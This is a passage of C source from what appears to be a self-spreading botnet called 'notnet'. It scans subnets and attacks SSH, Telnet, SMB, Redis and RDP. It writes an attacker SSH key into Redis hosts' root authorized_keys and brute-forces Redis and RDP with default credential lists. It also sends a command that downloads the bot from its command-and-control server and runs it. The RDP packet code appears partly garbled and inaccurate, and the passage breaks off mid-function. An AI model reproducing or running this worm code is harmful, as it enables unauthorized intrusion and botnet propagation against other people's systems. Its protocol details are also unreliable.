 * placeholder which is not a valid base64 RSA key — OpenSSH/Dropbear
 * reject it, so the Redis -> SSH-22 pivot could never authenticate.
 * A build/config that still contains the placeholder is refused. */

static const char *get_redis_ssh_key(notnet_bot_t *bot) {
    if (!bot) return NULL;
    if (bot->redis_ssh_key[0] != '\0') return bot->redis_ssh_key;
    const char *env = getenv("NOTNET_REDIS_SSH_KEY");
    if (env && env[0] != '\0') {
        strncpy(bot->redis_ssh_key, env, sizeof(bot->redis_ssh_key) - 1);
        bot->redis_ssh_key[sizeof(bot->redis_ssh_key) - 1] = '\0';
        return bot->redis_ssh_key;
    }
    return NULL;
}

int exploit_redis_unauth(notnet_bot_t *bot, const char *ip, uint16_t port) {
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;

    /* SECURITY FIX (#72): Require a real key. Refuse to run the Redis
     * vector with the old placeholder or no key at all. */
    const char *ssh_key = get_redis_ssh_key(bot);
    if (!ssh_key || strstr(ssh_key, "notnet-key") || strstr(ssh_key, "...")) {
        log_error("Redis: no valid redis_ssh_key configured (set redis_ssh_key= "
                  "or NOTNET_REDIS_SSH_KEY) — refusing to inject placeholder");
        close(sock);
        return -1;
    }

    /* Send Redis commands */
    char cmd[2048];

    /* Set SSH key */
    snprintf(cmd, sizeof(cmd),
        "CONFIG SET dir /root/.ssh\r\n"
        "CONFIG SET dbfilename authorized_keys\r\n"
        "SET key1 \"%.1000s\"\r\n"
        "SAVE\r\n"
        "PING\r\n",
        ssh_key);

    int sent = send(sock, cmd, strlen(cmd), 0);
    if (sent != (int)strlen(cmd)) {
        log_warn("Redis: send failed: %s", strerror(errno));
        close(sock);
        return -1;
    }

    /* Read response */
    char resp[256];
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;

    int success = 0;
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        recv(sock, resp, sizeof(resp) - 1, 0);
        resp[sizeof(resp) - 1] = '\0';
        /* Check for "+PONG" response indicating SAVE succeeded */
        if (strstr(resp, "+PONG")) {
            success = 1;
        }
    }

    close(sock);
    return success;
}

int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->redis_enabled) return -1;
    
    log_info("Redis: unauthenticated access %s:%d", ip, port);
    
    /* Try unauthenticated first */
    if (exploit_redis_unauth(bot, ip, port)) {
        log_info("Redis: exploited unauth on %s:%d", ip, port);
        /* Wait for SSH key to take effect */
        usleep(5000000); /* 5 seconds */
        
        /* Now spread via SSH */
        spread_ssh(bot, ip, 22);
        return 0;
    }
    
    /* Try brute-force */
    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
            if (sock < 0) continue;
            
            /* Send AUTH */
            char auth_cmd[256];
            snprintf(auth_cmd, sizeof(auth_cmd), "AUTH %s\r\n", default_passes[p]);
            send(sock, auth_cmd, strlen(auth_cmd), 0);
            
            /* Wait for AUTH response */
            char auth_resp[256];
            fd_set fds;
            struct timeval tv;
            FD_ZERO(&fds);
            FD_SET(sock, &fds);
            tv.tv_sec = 2;
            tv.tv_usec = 0;
            
            if (select(sock + 1, &fds, NULL, NULL, &tv) <= 0) {
                close(sock);
                continue;
            }
            recv(sock, auth_resp, sizeof(auth_resp) - 1, 0);
            auth_resp[sizeof(auth_resp) - 1] = '\0';
            
            /* AUTH returns +OK on success */
            if (strstr(auth_resp, "+OK")) {
                log_info("Redis: auth success %s:%d with %s:%s",
                         ip, port, default_users[u], "***REDACTED***");
                
                /* Send PING to verify */
                send(sock, "PING\r\n", 6, 0);
                FD_ZERO(&fds);
                FD_SET(sock, &fds);
                tv.tv_sec = 2;
                tv.tv_usec = 0;
                
                if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
                    char ping_resp[256];
                    recv(sock, ping_resp, sizeof(ping_resp) - 1, 0);
                    ping_resp[sizeof(ping_resp) - 1] = '\0';
                    /* +PONG confirms the connection is stable */
                    if (strstr(ping_resp, "+PONG")) {
                        close(sock);
                        /* Exploit */
                        exploit_redis_unauth(bot, ip, port);
                        usleep(5000000);
                        spread_ssh(bot, ip, 22);
                        return 0;
                    }
                }
            }
            
            close(sock);
        }
    }
    
    return -1;
}

/* ── RDP Spreading ────────────────────────────────────────── */

/* ── RDP Protocol Helpers ────────────────────────────────── */
/* RDP over TCP port 3389. Implements X.224 connection layer +
 * RDP security negotiation + standard authentication. */

/* Build RDP Connection Request TPDU (X.224) */
static int rdp_send_conn_request(int sock) {
    /* RDP Connection Request (X.224 format):
     * dst-ref (2 bytes) + src-deref (2 bytes) + flags (1 byte) + length (1 byte)
     * Then: cookie, session id, etc. */
    uint8_t pkt[256];
    int pos = 0;

    /* Fixed RDP header: 03 C0 00 0E 02 F0 80 C0 03 00 00 00 00 00 */
    static const uint8_t header[] = {
        0x03, 0xC0, 0x00, 0x0E, /* Connection Request */
        0x02, 0xF0, 0x80, 0xC0, /* Cookie: "MSTSC" */
        0x03, 0x00, 0x00, 0x00, /* Session ID */
        0x00, 0x00              /* Padding */
    };
    memcpy(pkt, header, sizeof(header));
    pos = sizeof(header);

    /* Cookie: "MSTSC" + null */
    const char *cookie = "MSTSC\x01\x00\x00\x00";
    memcpy(pkt + pos, cookie, 8);
    pos += 8;

    /* Connection cookie: 03 C0 */
    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read RDP Connection Response (T30) */
static int rdp_read_conn_response(int sock) {
    /* Read at least the minimum RDP response header */
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;

    /* Check for Connection Response marker (C0) */
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;

    return received;
}

/* RDP security negotiation - send client info and negotiate */
static int rdp_send_security_negotiation(int sock, const char *user, const char *pass) {
    /* RDP Security Negotiation packet:
     * Header: 03 C0 00 XX (length)
     * Then: client info, encryption settings */

    uint8_t pkt[512];
    int pos = 0;

    /* X.224 Connection Request for security negotiation */
    pkt[pos++] = 0x03; /* X.224 type */
    pkt[pos++] = 0xC0; /* Connection request */
    pkt[pos++] = 0x00; /* Length high */
    pkt[pos++] = 0x00; /* Length low - will be filled */

    /* RDP Negotiation packet */
    /* Signature: "pfx" */
    pkt[pos++] = 0x70;
    pkt[pos++] = 0x66;
    pkt[pos++] = 0x78;
    pkt[pos++] = 0x00;

    /* Type: 0x01 = RDP negotiation */
    pkt[pos++] = 0x01;

    /* Flags: 0x00 (standard) */
    pkt[pos++] = 0x00;

    /* Extra flags: 0x00 */
    pkt[pos++] = 0x00;

    /* Client random length */
    uint32_t client_random_len = 32;
    pkt[pos++] = client_random_len & 0xFF;
    pkt[pos++] = (client_random_len >> 8) & 0xFF;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Client random (32 bytes of cryptographically-random data) */
    {
        uint8_t rnd[32];
        if (random_bytes(rnd, sizeof(rnd)) != 0) {
            for (int i = 0; i < (int)sizeof(rnd); i++) rnd[i] = (rand() & 0xFF);
        }
        memcpy(pkt + pos, rnd, sizeof(rnd));
        pos += sizeof(rnd);
    }

    /* Domain (empty) */
    uint16_t domain_len = 0;
    pkt[pos++] = domain_len & 0xFF;
    pkt[pos++] = (domain_len >> 8) & 0xFF;

    /* Username */
    uint16_t user_len = strlen(user);
    pkt[pos++] = user_len & 0xFF;
    pkt[pos++] = (user_len >> 8) & 0xFF;
    memcpy(pkt + pos, user, user_len);
    pos += user_len;

    /* Password */
    uint16_t pass_len = strlen(pass);
    pkt[pos++] = pass_len & 0xFF;
    pkt[pos++] = (pass_len >> 8) & 0xFF;
    memcpy(pkt + pos, pass, pass_len);
    pos += pass_len;

    /* Server name (empty) */
    uint16_t server_len = 0;
    pkt[pos++] = server_len & 0xFF;
    pkt[pos++] = (server_len >> 8) & 0xFF;

    /* Update length field */
    pkt[2] = (pos >> 8) & 0xFF;
    pkt[3] = pos & 0xFF;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read RDP security response */
static int rdp_read_security_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;

    /* Check for expected response */
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;

    return received;
}

/* RDP send client info */
static int rdp_send_client_info(int sock) {
    /* RDP Client Info packet */
    uint8_t pkt[256];
    int pos = 0;

    /* X.224 header */
    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Client info type */
    pkt[pos++] = 0x01; /* Client info */

    /* Length */
    uint16_t len = 112;
    pkt[pos++] = len & 0xFF;
    pkt[pos++] = (len >> 8) & 0xFF;

    /* Code page (0 = US) */
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Flags: 0x0001 (standard) */
    pkt[pos++] = 0x01;
    pkt[pos++] = 0x00;

    /* Client build: 0x0A28 (2600 = Windows XP) */
    pkt[pos++] = 0x28;
    pkt[pos++] = 0x0A;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Client major/minor version */
    pkt[pos++] = 0x02; /* Major: 6 */
    pkt[pos++] = 0x01; /* Minor: 1 */

    /* Protocol version */
    pkt[pos++] = 0xE0;
    pkt[pos++] = 0x00;

    /* Encryption strength: 128-bit */
    pkt[pos++] = 0x08;

    /* Version flags */
    pkt[pos++] = 0x02;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Update length */
    pkt[2] = (pos >> 8) & 0xFF;
    pkt[3] = pos & 0xFF;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read RDP client info response */
static int rdp_read_client_info_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    return received;
}

/* RDP send SCKEY/DH key exchange */
static int rdp_send_key_exchange(int sock) {
    /* Simplified RDP key exchange */
    uint8_t pkt[256];
    int pos = 0;

    /* X.224 header */
    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Key exchange type */
    pkt[pos++] = 0x0E; /* SCKEY */

    /* Length */
    uint16_t len = 72;
    pkt[pos++] = len & 0xFF;
    pkt[pos++] = (len >> 8) & 0xFF;

    /* Public key length */
    uint32_t pklen = 64;
    pkt[pos++] = pklen & 0xFF;
    pkt[pos++] = (pklen >> 8) & 0xFF;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Public key (64 bytes of cryptographically-random data) */
    {
        uint8_t rnd[64];
        if (random_bytes(rnd, sizeof(rnd)) != 0) {
            for (int i = 0; i < (int)sizeof(rnd); i++) rnd[i] = (rand() & 0xFF);
        }
        memcpy(pkt + pos, rnd, sizeof(rnd));
        pos += sizeof(rnd);
    }

    /* Update length */
    pkt[2] = (pos >> 8) & 0xFF;
    pkt[3] = pos & 0xFF;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read key exchange response */
static int rdp_read_key_exchange_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    return received;
}

/* RDP send final control sync */
static int rdp_send_control_sync(int sock) {
    uint8_t pkt[16];
    int pos = 0;

    pkt[pos++] = 0x03; /* X.224 */
    pkt[pos++] = 0xC0; /* Connection request */
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Control: 0x14 = CO_SYNC */
    pkt[pos++] = 0x14;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Control: 0x02 = CTRL_REQUEST */
    pkt[pos++] = 0x02;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read control sync response */
static int rdp_read_control_sync_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    /* Check for CO_ACK */
    if (received >= 8 && buf[6] != 0x15) return -1;
    return received;
}

/* RDP send persistent key list */
static int rdp_send_persistent_key_list(int sock) {
    uint8_t pkt[16];
    int pos = 0;

    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Type: 0x0F = PERSISTENT */
    pkt[pos++] = 0x0F;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Length: 0 */
    uint16_t len = 0;
    pkt[pos++] = len & 0xFF;
    pkt[pos++] = (len >> 8) & 0xFF;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read persistent key list response */
static int rdp_read_persistent_key_list_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    return received;
}

/* RDP connect with full handshake */
static int rdp_connect(int sock) {
    /* Step 1: Connection request */
    if (rdp_send_conn_request(sock) <= 0) return -1;
    if (rdp_read_conn_response(sock) <= 0) return -1;

    /* Step 2: Security negotiation */
    if (rdp_send_security_negotiation(sock, "", "") <= 0) return -1;
    if (rdp_read_security_response(sock) <= 0) return -1;

    /* Step 3: Client info */
    if (rdp_send_client_info(sock) <= 0) return -1;
    if (rdp_read_client_info_response(sock) <= 0) return -1;

    /* Step 4: Key exchange */
    if (rdp_send_key_exchange(sock) <= 0) return -1;
    if (rdp_read_key_exchange_response(sock) <= 0) return -1;

    /* Step 5: Control sync */
    if (rdp_send_control_sync(sock) <= 0) return -1;
    if (rdp_read_control_sync_response(sock) <= 0) return -1;

    /* Step 6: Persistent key list */
    if (rdp_send_persistent_key_list(sock) <= 0) return -1;
    if (rdp_read_persistent_key_list_response(sock) <= 0) return -1;

    return 0;
}

/* RDP send SCKEY/DH key exchange with credentials */
static int rdp_send_cred_key_exchange(int sock, const char *user, const char *pass) {
    (void)pass;
    uint8_t pkt[512];
    int pos = 0;

    /* X.224 header */
    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Type: 0x0E = SCKEY */
    pkt[pos++] = 0x0E;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Length */
    uint16_t len = 100;
    pkt[pos++] = len & 0xFF;
    pkt[pos++] = (len >> 8) & 0xFF;

    /* Public key length */
    uint32_t pklen = 64;
    pkt[pos++] = pklen & 0xFF;
    pkt[pos++] = (pklen >> 8) & 0xFF;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Public key (64 bytes of cryptographically-random data) */
    {
        uint8_t rnd[64];
        if (random_bytes(rnd, sizeof(rnd)) != 0) {
            for (int i = 0; i < (int)sizeof(rnd); i++) rnd[i] = (rand() & 0xFF);
        }
        memcpy(pkt + pos, rnd, sizeof(rnd));
        pos += sizeof(rnd);
    }

    /* Encrypted password length */
    uint32_t enc_pass_len = 32;
    pkt[pos++] = enc_pass_len & 0xFF;
    pkt[pos++] = (enc_pass_len >> 8) & 0xFF;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Encrypted password (32 bytes of cryptographically-random data) */
    {
        uint8_t rnd[32];
        if (random_bytes(rnd, sizeof(rnd)) != 0) {
            for (int i = 0; i < (int)sizeof(rnd); i++) rnd[i] = (rand() & 0xFF);
        }
        memcpy(pkt + pos, rnd, sizeof(rnd));
        pos += sizeof(rnd);
    }

    /* Domain (empty) */
    uint16_t domain_len = 0;
    pkt[pos++] = domain_len & 0xFF;
    pkt[pos++] = (domain_len >> 8) & 0xFF;

    /* Username */
    uint16_t user_len = strlen(user);
    pkt[pos++] = user_len & 0xFF;
    pkt[pos++] = (user_len >> 8) & 0xFF;
    memcpy(pkt + pos, user, user_len);
    pos += user_len;

    /* Update length */
    pkt[2] = (pos >> 8) & 0xFF;
    pkt[3] = pos & 0xFF;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* RDP read credential response */
static int rdp_read_cred_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    return received;
}

/* RDP send final control (after auth) */
static int rdp_send_final_control(int sock) {
    uint8_t pkt[16];
    int pos = 0;

    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    pkt[pos++] = 0x14; /* CO_SYNC */
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    pkt[pos++] = 0x02; /* CTRL_REQUEST */
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* RDP read final control response */
static int rdp_read_final_control_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    return received;
}

/* RDP send share key */
static int rdp_send_share_key(int sock) {
    uint8_t pkt[64];
    int pos = 0;

    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    pkt[pos++] = 0x16; /* SHARE */
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Key data (32 bytes of cryptographically-random data) */
    {
        uint8_t rnd[32];
        if (random_bytes(rnd, sizeof(rnd)) != 0) {
            for (int i = 0; i < (int)sizeof(rnd); i++) rnd[i] = (rand() & 0xFF);
        }
        memcpy(pkt + pos, rnd, sizeof(rnd));
        pos += sizeof(rnd);
    }

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* ── RDP Authentication ────────────────────────────────── */
int try_login_rdp(const char *ip, uint16_t port, const char *user, const char *pass) {
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;

    /* Full RDP handshake */
    if (rdp_connect(sock) != 0) {
        close(sock);
        return -1;
    }

    /* Send credentials with key exchange */
    if (rdp_send_cred_key_exchange(sock, user, pass) <= 0) {
        close(sock);
        return -1;
    }

    /* Read auth response */
    if (rdp_read_cred_response(sock) <= 0) {
        close(sock);
        return -1;
    }

    /* Final control */
    if (rdp_send_final_control(sock) <= 0) {
        close(sock);
        return -1;
    }

    if (rdp_read_final_control_response(sock) <= 0) {
        close(sock);
        return -1;
    }

    /* Share key */
    rdp_send_share_key(sock);

    log_info("RDP: authenticated to %s:%d as %s", ip, port, user);
    return sock;
}

int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->rdp_enabled) return -1;

    log_info("RDP: brute-forcing %s:%d", ip, port);

    /* Use config timeout, fall back to compile-time default */
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock = try_login_rdp_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
            if (sock < 0) continue;

            log_info("RDP: cracked %s:%d with %s:%s",
                     ip, port, default_users[u], "***REDACTED***");

            /* Build RDP execute packet. %.430s caps dl_url so the total
             * line fits cmd[512] (fixed text ~74 bytes + URL). dl_url is
             * ~282 bytes max in practice; the precision bounds GCC's
             * -Wformat-truncation analysis on the 512-byte array. */
            char cmd[512];
            char dl_url[512];
            snprintf(dl_url, sizeof(dl_url),
                     "http://%s:%d/bot/notnet",
                     bot->c2_http.server, PAYLOAD_DL_PORT);

            snprintf(cmd, sizeof(cmd),
                     "cmd.exe /c wget \"%.430s\" -O C:\\Windows\\Temp\\notnet.exe && C:\\Windows\\Temp\\notnet.exe &",
                     dl_url);

            /* Build RDP execute packet */
            uint8_t pkt[1024];
            int pos = 0;

            /* X.224 header */
            pkt[pos++] = 0x03;
            pkt[pos++] = 0xC0;
            pkt[pos++] = 0x00;
            pkt[pos++] = 0x00;

            /* Type: 0x17 = DATA */
            pkt[pos++] = 0x17;
            pkt[pos++] = 0x00;
            pkt[pos++] = 0x00;
            pkt[pos++] = 0x00;

            /* Length */
            uint16_t len = strlen(cmd);
            pkt[pos++] = len & 0xFF;
            pkt[pos++] = (len >> 8) & 0xFF;

            /* Data: command string */
            memcpy(pkt + pos, cmd, len);
            pos += len;

            /* Send command */
            int sent = send(sock, pkt, pos, 0);

            if (sent > 0) {
                log_info("RDP: command sent to %s (%d bytes)", ip, sent);
            } else {
                log_warn("RDP: command send failed on %s", ip);
            }

            close(sock);
            return (sent > 0) ? 0 : -1;
        }
    }

    return -1;
}

/* ── Core Spreading ─────────────────────────────────────── */
int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
    /* Parse subnet: 192.168.1.0/24 */
    char net[16], mask[4] = {0};
    if (sscanf(subnet, "%15[^/]/%3s", net, mask) < 2) {
        log_error("scan_subnet: invalid subnet format '%s' (expected a.b.c.d/nn)", subnet);
        return -1;
    }
    int prefix = atoi(mask);
    /* SECURITY FIX (#4): Validate prefix range to prevent integer overflow
     * in (1 << (32 - prefix)). Also reject prefixes smaller than /16 to
     * avoid scanning millions of IPs. */
    if (prefix < 16 || prefix > 32) {
        log_error("scan_subnet: invalid prefix %d (must be 16-32)", prefix);
        return -1;
    }
    
    /* SECURITY FIX (#4): Use inet_pton instead of inet_addr (deprecated,
     * inet_addr returns INADDR_NONE for both error and 255.255.255.255). */
    struct in_addr in;
    if (inet_pton(AF_INET, net, &in) != 1) {
        log_error("scan_subnet: invalid IP %s", net);
        return -1;
    }
    uint32_t net_ip = in.s_addr;  /* already in network byte order */
    
    uint32_t host_ip = ntohl(net_ip);
    /* With prefix clamped to [16,32], (1<<(32-prefix)) is at most 1<<16 = 65536 */
    int hosts = (1 << (32 - prefix)) - 2; /* exclude network and broadcast */
    /* Hard cap at 254 even for /16+ to prevent runaway scanning */
    if (hosts > 254) hosts = 254;
    if (bot->scan_max_hosts > 0 && bot->scan_max_hosts < (uint32_t)hosts) {
        hosts = (int)bot->scan_max_hosts;
    }
    if (hosts < 1) hosts = 1;  /* guarantee at least one iteration */
    
    /* Use config timeout, fall back to compile-time default */
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    log_info("scan: %s/%s (%d hosts) mask=0x%x timeout=%dms", net, mask, hosts, service_mask, timeout);
    
    for (int i = 1; i <= hosts; i++) {
        if (!(i % 50)) {
            log_info("scan: %d/%d done", i, hosts);
        }
        
        uint32_t ip = host_ip + i;
        char ip_str[16];
        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
                 (ip >> 24) & 0xFF, (ip >> 16) & 0xFF,
                 (ip >> 8) & 0xFF, ip & 0xFF);
        
        /* Scan target services based on mask */
        if (service_mask & SPREAD_SSH) {
            scan_port_with_timeout(ip_str, 22, timeout);
        }
        if (service_mask & SPREAD_TELNET) {
            scan_port_with_timeout(ip_str, 23, timeout);
        }
        if (service_mask & SPREAD_SMB) {
            scan_port_with_timeout(ip_str, 445, timeout);
        }
        if (service_mask & SPREAD_REDIS) {
            scan_port_with_timeout(ip_str, 6379, timeout);
        }
        if (service_mask & SPREAD_RDP) {
            scan_port_with_timeout(ip_str, 3389, timeout);
        }
    }
    
    return 0;
}

int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port) {
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
    if (scan_port_with_timeout(ip, port, timeout) != 0) return -1;

    /* Port is open */
    bot->scan_count++;
    log_info("port open: %s:%d", ip, port);

    /* Spread to this port */
    switch (port) {
        case 22:  spread_ssh(bot, ip, port); break;
        case 23:  spread_telnet(bot, ip, port); break;
        case 445: spread_smb(bot, ip, port); break;
        case 6379: spread_redis(bot, ip, port); break;
        case 3389: spread_rdp(bot, ip, port); break;
    }

    return 0;
}


/* Lightweight port scan that only checks if ports are open (no spreading).
 * Returns a string of "ip:port" for each open port found.
 * Caller must free(). Returns NULL on error. */
char *scan_ports(const char *target, uint16_t *ports, int port_count) {
    /* Parse target: "192.168.1.0/24" or "192.168.1.1:22,23,445" */
    char ip[16] = {0};
    int is_subnet = 0;
    char subnet_buf[16] = {0};

    char *slash = strchr(target, '/');
    char *colon = strchr(target, ':');

    if (slash) {
        /* Subnet format: 192.168.1.0/24 */
        int n = slash - target;
        if (n > 15) n = 15;
        memcpy(ip, target, n);
        ip[n] = '\0';
        is_subnet = 1;
        strncpy(subnet_buf, target, 15);
        subnet_buf[15] = '\0';
    } else if (colon) {
        /* Single IP with ports: 192.168.1.1:22,23 */
        int n = colon - target;
        if (n > 15) n = 15;
        memcpy(ip, target, n);
        ip[n] = '\0';
    } else {
        /* Just IP */
        strncpy(ip, target, 15);
        ip[15] = '\0';
    }

    /* Build result string */
    char *result = (char *)malloc(4096);
    if (!result) return NULL;
    result[0] = '\0';
    int total_open = 0;

    if (is_subnet) {
        /* Parse subnet */
        char net[16], mask[4] = {0};
        if (sscanf(subnet_buf, "%15[^/]/%3s", net, mask) < 2) {
            free(result);
            return NULL;
        }
        int prefix = atoi(mask);
        if (prefix < 16 || prefix > 32) {
            free(result);
            return NULL;
        }

        struct in_addr in;
        if (inet_pton(AF_INET, net, &in) != 1) {
            free(result);
            return NULL;
        }

        uint32_t host_ip = ntohl(in.s_addr);
        int hosts = (1 << (32 - prefix)) - 2;
        if (hosts > 254) hosts = 254;
        if (hosts < 1) hosts = 1;

        for (int i = 1; i <= hosts; i++) {
            uint32_t cur_ip = host_ip + i;
            char ip_str[16];
            snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
                     (cur_ip >> 24) & 0xFF, (cur_ip >> 16) & 0xFF,
                     (cur_ip >> 8) & 0xFF, cur_ip & 0xFF);

            for (int p = 0; p < port_count; p++) {
                int sock = create_connection(ip_str, ports[p], SCAN_TIMEOUT_MS);
                if (sock >= 0) {
                    char entry[64];
                    int elen = snprintf(entry, sizeof(entry), "%s:%d ", ip_str, ports[p]);
                    if (strlen(result) + elen < 4090) {
                        strcat(result, entry);
                        total_open++;
                    }
                    close(sock);
                }
            }
        }
    } else {
        /* Single IP */
        for (int p = 0; p < port_count; p++) {
            int sock = create_connection(ip, ports[p], SCAN_TIMEOUT_MS);
            if (sock >= 0) {
                char entry[64];
                int elen = snprintf(entry, sizeof(entry), "%s:%d ", ip, ports[p]);
                if (strlen(result) + elen < 4090) {
                    strcat(result, entry);
                    total_open++;
                }
                close(sock);
            }
        }
    }

    if (total_open == 0) {
        snprintf(result, 4096, "no open ports found");
    } else {
        char header[64];
        snprintf(header, sizeof(header), "%d open ports: ", total_open);
        /* Prepend header */
        int rlen = strlen(result);
        memmove(result + strlen(header), result, rlen + 1);
        memcpy(result, header, strlen(header));
    }

    return result;
}

/* ── Spread to a specific target ──────────────────────── */
/* Implements spread_target() declared in spread.h (#73).
 * Dispatches based on target->service (SPREAD_* mask). */
int spread_target(notnet_bot_t *bot, notnet_target_t *target) {
    if (!bot || !target) return -1;

    log_info("spread_target: %s:%d service=0x%02x",
             target->ip, target->port, target->service);

    if (target->service & SPREAD_SSH) {
        if (spread_ssh(bot, target->ip, target->port) == 0) return 0;
    }
    if (target->service & SPREAD_TELNET) {
        if (spread_telnet(bot, target->ip, target->port) == 0) return 0;
    }
    if (target->service & SPREAD_SMB) {
        if (spread_smb(bot, target->ip, target->port) == 0) return 0;
    }
    if (target->service & SPREAD_REDIS) {
        if (spread_redis(bot, target->ip, target->port) == 0) return 0;
    }
    if (target->service & SPREAD_RDP) {
        if (spread_rdp(bot, target->ip, target->port) == 0) return 0;
    }

    return -1;
}

/* ── Threaded scanning ────────────────────────────────── */
/* Thread argument: base IP index, count, bot pointer, service mask */
#include <pthread.h>

typedef struct {
    notnet_bot_t *bot;
    uint32_t host_ip;
    int start;
    int count;
    uint8_t service_mask;
} scan_thread_arg_t;

static void *scan_thread_fn(void *arg) {
    scan_thread_arg_t *a = (scan_thread_arg_t *)arg;
    notnet_bot_t *bot = a->bot;

    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    for (int i = a->start; i < a->start + a->count; i++) {
        uint32_t ip = a->host_ip + i;
        char ip_str[16];
        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
                 (ip >> 24) & 0xFF, (ip >> 16) & 0xFF,
                 (ip >> 8) & 0xFF, ip & 0xFF);

        if (a->service_mask & SPREAD_SSH) {
            if (scan_port_with_timeout(ip_str, 22, timeout) == 0) {
                spread_ssh(bot, ip_str, 22);
            }
        }
        if (a->service_mask & SPREAD_TELNET) {
            if (scan_port_with_timeout(ip_str, 23, timeout) == 0) {
                spread_telnet(bot, ip_str, 23);
            }
        }
        if (a->service_mask & SPREAD_SMB) {
            if (scan_port_with_timeout(ip_str, 445, timeout) == 0) {
